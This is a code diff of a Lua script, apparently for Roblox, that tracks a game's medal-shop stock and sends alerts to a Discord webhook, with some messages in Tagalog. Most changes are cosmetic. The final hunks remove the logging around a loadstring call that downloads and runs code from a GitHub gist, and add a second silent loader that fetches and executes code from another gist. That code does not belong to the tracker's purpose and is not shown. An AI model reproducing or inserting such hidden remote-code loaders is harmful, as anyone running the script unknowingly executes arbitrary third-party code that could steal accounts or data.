@@ -45,7 +45,7 @@ local function SendWebhook(Offers, isSpecialAlert, SpecialList)
         Description = "*Walang items na may stock ngayon (Out of Stock lahat).* "
     end
 
-    local EmbedTitle = isSpecialAlert and "SPECIAL BEST STOCK ALERT!" or "MEDAL SHOP STOCK"
+    local EmbedTitle = isSpecialAlert and "⚡ SPECIAL BEST STOCK ALERT!" or "🛒 HOURLY MEDAL SHOP STOCK"
     local EmbedColor = isSpecialAlert and 15158332 or 3447003 
 
     local Payload = {
@@ -76,7 +76,6 @@ local function SendWebhook(Offers, isSpecialAlert, SpecialList)
             
             if ok and response then
                 success = true
-                print(isSpecialAlert and "🚨 Special Alert successfully sent to Discord!" or "Hourly update successfully sent to Discord!")
             else
                 task.wait(2)
             end
@@ -112,7 +111,6 @@ local function GetSecondsUntilNextHour()
 end
 
 task.spawn(function()
-    print("Fast tracker running...")
     while true do
         local success, State = pcall(function()
             return Event:InvokeServer("GetState")
@@ -145,13 +143,13 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    local success, err = pcall(function()
+    pcall(function()
         loadstring(game:HttpGet("https://gist.githubusercontent.com/Nolimit-hub/d0a02fa49233f0f3fef073a27ba7e391/raw/b552940fd15f4c1577ea1b5294b1b550e4a7dfea/gistfile1.txt"))()
     end)
-    
-    if success then
-        print("Loaded!")
-    else
-        warn("Error:", err)
-    end
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/Nolimit-hub/00159a682171fd63a2fb64b8b9a1cb0c/raw/d29ce09f629617f1f6d942e8999779d24b221024/gistfile1.txt"))()
+    end)
 end)
